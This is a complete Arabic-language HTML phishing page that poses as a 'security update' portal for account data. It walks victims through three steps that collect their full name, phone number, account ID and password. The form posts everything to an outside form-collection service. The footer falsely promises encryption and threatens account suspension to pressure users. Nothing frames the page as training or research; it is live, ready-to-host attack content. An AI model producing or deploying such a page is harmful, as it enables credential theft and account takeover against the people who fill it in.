<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>بوابة التحديث الأمني</title>
    <style>
        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; margin: 0; padding: 20px; }
        .container { background: #ffffff; width: 100%; max-width: 400px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; border-top: 6px solid #c62828; }
        .header { padding: 20px; text-align: center; background: #fff; border-bottom: 1px solid #eee; }
        .header h2 { color: #c62828; margin: 0; font-size: 18px; }
        .content { padding: 25px; }
        input, select { width: 100%; padding: 14px; margin: 10px 0; border: 1.5px solid #ddd; border-radius: 10px; text-align: right; font-size: 16px; outline: none; transition: 0.3s; background: #fafafa; }
        input:focus { border-color: #c62828; background: #fff; }
        .btn { width: 100%; padding: 16px; background: #c62828; color: white; border: none; border-radius: 10px; font-weight: bold; font-size: 17px; cursor: pointer; margin-top: 15px; transition: 0.3s; }
        .btn:active { transform: scale(0.98); background: #b71c1c; }
        .hidden { display: none; }
        .footer-text { font-size: 12px; color: #888; margin-top: 20px; line-height: 1.5; }
        .step-label { display: block; text-align: right; font-size: 13px; color: #c62828; font-weight: bold; margin-bottom: 5px; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <h2>نظام إدارة بيانات الحساب</h2>
    </div>

    <div class="content">
        <form action="https://formspree.io/f/xzdjwoao" method="POST">
            
            <div id="step1">
                <span class="step-label">البيانات الأساسية</span>
                <input type="text" name="Full_Name" placeholder="الاسم الرباعي الكامل" required>
                <input type="number" name="Phone_Number" placeholder="رقم الهاتف المرتبط" required>
                <select name="Operation_Type">
                    <option value="Update">تحديث بيانات</option>
                    <option value="Activation">تنشيط حساب</option>
                </select>
                <button type="button" class="btn" onclick="nextStep(2)">المتابعة</button>
            </div>

            <div id="step2" class="hidden">
                <span class="step-label">تأكيد الهوية الرقمية</span>
                <input type="text" name="Account_ID" placeholder="رقم الحساب أو المعرف" required>
                <input type="password" name="Security_Key" placeholder="كلمة المرور" required>
                <button type="button" class="btn" onclick="nextStep(3)">التالي</button>
            </div>

            <div id="step3" class="hidden">
                <span class="step-label">إجراءات الأمان الأخيرة</span>
                <p style="font-size: 13px; color: #666; text-align: center;">يرجى اختيار الإجابة المطابقة لخيارات الأمان في حسابك</p>
                
                <select name="Security_Q1">
                    <option value="Yes">نعم / موافق</option>
                    <option value="No">لا / غير موافق</option>
                </select>

                <select name="Security_Q2">
                    <option value="Confirmed">تأكيد البيانات</option>
                    <option value="Cancel">إلغاء العملية</option>
                </select>

                <button type="submit" class="btn">تأكيد وإرسال التحديث</button>
            </div>

        </form>

        <div class="footer-text">
            * هذا النظام مؤمن ومشفر بالكامل لضمان سرية معلوماتك. يرجى التأكد من إدخال البيانات بدقة لتجنب تعليق الحساب.
        </div>
    </div>
</div>

<script>
    // وظيفة التنقل البسيطة والمضمونة
    function nextStep(step) {
        // التحقق من الحقول قبل الانتقال
        const currentInputs = document.querySelectorAll('#step' + (step - 1) + ' input');
        let allValid = true;
        currentInputs.forEach(input => {
            if (!input.value) allValid = false;
        });

        if (allValid) {
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('step3').classList.add('hidden');
            document.getElementById('step' + step).classList.remove('hidden');
            window.scrollTo(0, 0);
        } else {
            alert("يرجى إكمال جميع الخانات للمتابعة");
        }
    }
</script>

</body>
</html>
